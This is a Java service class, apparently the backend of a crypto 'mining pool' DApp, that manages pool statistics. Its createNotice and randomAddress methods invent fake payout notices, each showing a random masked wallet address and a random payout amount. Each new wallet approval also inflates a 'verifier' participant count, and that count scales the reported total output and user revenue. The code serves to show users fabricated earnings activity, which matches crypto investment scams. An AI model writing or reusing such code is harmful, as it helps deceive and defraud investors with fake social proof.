package project.monitor.internal;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.orm.hibernate5.support.HibernateDaoSupport;

import kernel.util.Arith;
import kernel.util.JsonUtils;
import kernel.util.StringUtils;
import project.data.DataService;
import project.data.model.Realtime;
import project.monitor.AutoMonitorPoolDataService;
import project.monitor.model.AutoMonitorPoolData;
import project.monitor.report.DAppData;
import project.monitor.report.DAppUserDataSumService;
import project.syspara.SysparaService;

public class AutoMonitorPoolDataServiceImpl extends HibernateDaoSupport implements AutoMonitorPoolDataService {

	private Logger logger = LoggerFactory.getLogger(AutoMonitorPoolDataServiceImpl.class);
	private DAppUserDataSumService dAppUserDataSumService;
	private DataService dataService;
	protected SysparaService sysparaService;

	@Override
	public void save(AutoMonitorPoolData entity) {

		this.getHibernateTemplate().save(entity);

	}

	@Override
	public void update(AutoMonitorPoolData entity) {
		getHibernateTemplate().update(entity);
	}

	@Override
	public AutoMonitorPoolData findById(String id) {
		return (AutoMonitorPoolData) getHibernateTemplate().get(AutoMonitorPoolData.class, id);
	}

	/**
	 * 默认数据
	 * 
	 * @param id
	 * @return
	 */
	public AutoMonitorPoolData findDefault() {
		List<AutoMonitorPoolData> list = (List<AutoMonitorPoolData>) getHibernateTemplate().find(" FROM AutoMonitorPoolData ");
		return list.get(0);
	}

	/**
	 * 当有新的授权时，更新数据
	 */
	public void updatePoolDataByApproveSuccess() {
		AutoMonitorPoolData findDefault = findDefault();
		String symbol = sysparaService.find("notice_Logs_symbol").getValue();
		double close = 0;
		if ("usdt".equals(symbol)) {
			close = 0.068;
		}else {
			Realtime realtime = dataService.realtime("eth").get(0);
			close = realtime.getClose();
		}
		findDefault.setNotice_logs(JsonUtils.bean2Json(createNotice(close)));
		findDefault.setVerifier(findDefault.getVerifier() + (int) (findDefault.getRate() * 1));
		update(findDefault);
	}

	/**
	 * 新增新的提醒
	 * 
	 */
	public List<Map<String, Object>> createNotice(double close) {
		// 随机生成40~70
		Random random = new Random();
		List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
		for (int i = 0; i < 30; i++) {
			// 生成随机地址 wanhao 10-15000
			Map<String, Object> map = new HashMap<String, Object>();
			double money = 30 * random.nextDouble() + 40d;
			map.put("address", hideAddress(randomAddress(), 6));
			map.put("money", Arith.div(money, close, 6));
			list.add(map);
		}
		return list;
	}

	private String randomAddress() {
		char[] all = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
		Random random = new Random();
		StringBuffer sb = new StringBuffer("0x");
		for (int i = 0; i < 40; i++) {
			sb.append(all[random.nextInt(all.length)]);
		}
		return sb.toString();
	}

	/**
	 * 隐藏地址
	 * 
	 * @param address
	 * @param hideLength
	 * @return
	 */
	public String hideAddress(String address, int hideLength) {
		if (StringUtils.isEmptyString(address)) {
			return address;
		}
		if (address.length() > hideLength * 2) {
			return address.substring(0, hideLength) + "****" + address.substring(address.length() - hideLength);
		}
		return address;
	}

	/**
	 * 矿池产生收益时数据处理
	 * 
	 * @param outPut eth收益
	 */
	public void updateDefaultOutPut(double outPut) {
		try {
			List<Realtime> realtime_list = this.dataService.realtime("eth");
			Realtime realtime = null;
			if (realtime_list.size() > 0) {
				realtime = realtime_list.get(0);
			}
			Double close = realtime.getClose();
			DAppData cacheGetData = dAppUserDataSumService.cacheGetData(new Date());
	
			AutoMonitorPoolData findDefault = findDefault();
	//		总产量=矿机产生的eth*（参与者/实际参与者）
	//		double totle = Arith.mul(outPut, Arith.div(findDefault.getVerifier(), cacheGetData.getUsdt_user_count()));
			double totle = Arith.mul(outPut, Arith.div(findDefault.getVerifier(),
					cacheGetData.getUsdt_user_count() == 0 ? 1 : cacheGetData.getUsdt_user_count()));
			findDefault.setTotal_output(Arith.add(findDefault.getTotal_output(), totle));
	//		用户收益=总产量*eth行情
			double userProfit = Arith.mul(totle, close);
			findDefault.setUser_revenue(Arith.add(findDefault.getUser_revenue(), userProfit));
			this.update(findDefault);
		}catch (Exception e) {
			// TODO: handle exception
			logger.error("AutoMonitorPoolDataServiceImpl.updateDefaultOutPut fail e:",e);
			e.printStackTrace();
		}
	}

	public void setdAppUserDataSumService(DAppUserDataSumService dAppUserDataSumService) {
		this.dAppUserDataSumService = dAppUserDataSumService;
	}

	public void setDataService(DataService dataService) {
		this.dataService = dataService;
	}

	public void setSysparaService(SysparaService sysparaService) {
		this.sysparaService = sysparaService;
	}

}
